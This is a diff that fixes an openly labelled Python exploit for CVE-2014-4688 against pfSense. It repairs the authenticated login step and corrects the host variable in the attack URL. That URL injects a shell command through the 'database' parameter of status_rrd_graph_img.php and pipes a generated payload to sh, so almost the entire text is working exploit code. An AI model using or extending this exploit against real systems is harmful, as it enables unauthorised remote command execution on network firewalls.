@@ -1,7 +1,9 @@
 import argparse
 import requests
 import urllib3
+import urllib
 import collections
+import sys
 from log_colors import *
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -54,14 +56,18 @@ class CVE2014_4688:
             "passwordfld" : self.pswd,
             "login" : "Login",
         }
+        data = collections.OrderedDict(data)
+        data = urllib.parse.urlencode(data)
         r = self.session.post(
             self.login_url,
-            data = data, headers = self.headers, verify = False
+            data = data, headers = self.headers, verify = False,
+            cookies = self.session.cookies
         )
-        if r.ok:
+        if r.ok and "/index.php?logout" in r.text:
             print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
         else:
             print (LogColors.RED + "error login..." + LogColors.ENDC)
+            sys.exit()
 
     # generate payload
     def generate_payload(self):
@@ -85,7 +91,7 @@ class CVE2014_4688:
         self.login()
         print (LogColors.BLUE + "running exploit..." + LogColors.ENDC)
         payload = self.generate_payload()
-        exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?"
+        exploit_url = "https://" + self.rhost + "/status_rrd_graph_img.php?"
         exploit_url += "database=queues;" + "printf+" + "'" + payload + "'|sh"
         print (LogColors.YELLOW + "exploit: " + exploit_url + LogColors.ENDC)
         try:
